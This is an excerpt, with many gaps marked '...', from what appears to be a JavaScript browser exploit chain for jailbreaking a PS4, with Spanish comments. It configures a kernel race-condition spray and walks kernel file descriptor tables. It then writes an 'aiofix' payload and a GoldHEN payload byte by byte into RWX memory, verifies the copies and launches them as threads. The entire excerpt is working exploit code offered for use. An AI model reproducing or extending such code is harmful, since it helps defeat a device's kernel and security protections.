// chain_poops_v5.js — Dos payloads: aiofix primero, luego GoldHEN
...
// AJUSTES RÁPIDOS
// ============================================================
const CFG_IOV_WORKERS   = 1;   // workers para el iov spray
const CFG_UIO_WORKERS   = 1;   // workers para el UIO spray
const CFG_ATTEMPTS      = 4;   // intentos del race
const CFG_MSDELAY       = 2;   // ms entre dup() y close()
const CFG_USE_REALTIME  = 0;   // 0 = sin pin RT
const CFG_USE_PAIR      = 0;   // 0 = sin promote
const CFG_VERBOSE       = 1;   // 1 = log completo
...
function check(name, ok, detail) {
    try {
        if (window.__TM) {
            ...
            if (!ok) window.__TM.errors.push({ ts: Date.now() - window.__TM.startedAt, message: 'CHECK-FAIL: ' + name + '  ' + (detail || ''), file: 'chain_poops_v5.js', line: 0, col: 0, stack: '' });
            if (window.__TM.render) window.__TM.render();
        }
    } catch (e) { }
        ...
        if (kernelBase && triplets) {
            ...
            if (check("ofiles-walk-reached-pipes", kptr(fdtOfiles) && kptr(mFp) && kptr(sFp) && kptr(mData) && kptr(sData), "")) {
                ...
                if (wrote) {
                    ...
                    // ============================================================
                    // PAYLOAD EN DOS ETAPAS: aiofix primero, GoldHEN después
                    // ============================================================
                    ...
                    if (CFG_DO_PAYLOAD === 1 && (kpatched || params.get("payload") === "1") && params.get("payload") !== "0") {
                        ...
                        if (aiofix && aiofix.length > 0) {
                            ...
                            if (aEntry.hi > 0) {
                                ...
                                for (let i = 0; i < aiofix.length; ++i)
                                    p.write1(aEntry.add32(i), aiofix[i]);

                                // Verificar copia
                                let aBad = -1;
                                for (let i = 0; i < aiofix.length; ++i)
                                    if (p.read1(aEntry.add32(i)) !== aiofix[i]) { aBad = i; break; }
                                check("aiofix-byte-rwx-memory", aBad < 0,
                                    aBad < 0 ? aiofix.length + " bytes" : "mismatch at +" + hx(aBad));
                                ...
                                if (aBad < 0 && off.wk___imp_pthread_create !== undefined) {
                                    ...
                                    if (agree) {
                                        ...
                                        if (aiofixRan) mark("AIOFIX-RUNNING",
                                            "bytes=" + aiofix.length + " entry=" + aEntry);

                                        // Dar tiempo a aiofix para aplicar sus parches
                            ...
                            mark("AIOFIX-SKIPPED", "no aiofix cargado, saltando directo a GoldHEN");
                        }
                        ...
                        if (payload) {
                            ...
                            if (entry.hi > 0) {
                                ...
                                check("byte-payload-rwx-memory", bad < 0,
                                    bad < 0 ? payload.length + " bytes" : "mismatch at +" + hx(bad));
